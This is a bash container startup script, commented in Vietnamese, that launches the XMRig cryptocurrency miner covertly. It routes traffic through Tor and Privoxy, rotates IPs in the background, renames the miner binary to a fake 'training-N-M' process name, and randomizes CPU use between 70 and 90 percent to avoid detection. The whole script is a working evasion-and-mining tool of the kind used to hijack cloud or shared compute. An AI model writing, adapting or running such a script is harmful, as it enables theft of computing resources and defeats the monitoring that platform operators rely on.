#!/bin/bash

# Khởi động dịch vụ Tor và Privoxy
service tor start
service privoxy start

# Khởi động script đổi IP ngẫu nhiên trong nền
/root/change_ip.sh &

# Kiểm tra xem xmrig_name.txt có tồn tại không, nếu không thì tạo tên mới và khởi động XMRig
if [ ! -f /root/xmrig_name.txt ]; then
    RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
    mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/$RANDOM_NAME
    chmod +x $WORK_DIR/$RANDOM_NAME
    echo $RANDOM_NAME > /root/xmrig_name.txt
    echo "Chạy XMRig với tên mới $RANDOM_NAME..."
    
    # Tính toán tỷ lệ CPU sử dụng ngẫu nhiên từ 70% đến 90%
    total_cores=$(nproc)  # Lấy tổng số lõi CPU trên hệ thống
    cpu_hint=$(shuf -i 70-90 -n 1)  # Lấy ngẫu nhiên một giá trị phần trăm từ 70 đến 90
    threads=$(echo "$total_cores * $cpu_hint / 100" | bc)  # Tính số luồng cần sử dụng dựa trên tổng số lõi và phần trăm

    # Chạy XMRig với số luồng tính toán
    torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$threads
else
    # Nếu đã có tên, khởi động lại XMRig
    RANDOM_NAME=$(cat /root/xmrig_name.txt)
    echo "Chạy lại XMRig với tên $RANDOM_NAME..."
    
    # Tính toán tỷ lệ CPU sử dụng ngẫu nhiên từ 70% đến 90%
    total_cores=$(nproc)  # Lấy tổng số lõi CPU trên hệ thống
    cpu_hint=$(shuf -i 70-90 -n 1)  # Lấy ngẫu nhiên một giá trị phần trăm từ 70 đến 90
    threads=$(echo "$total_cores * $cpu_hint / 100" | bc)  # Tính số luồng cần sử dụng dựa trên tổng số lõi và phần trăm

    # Chạy XMRig với số luồng tính toán
    torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$threads
fi

# Giữ container chạy
tail -f /dev/null
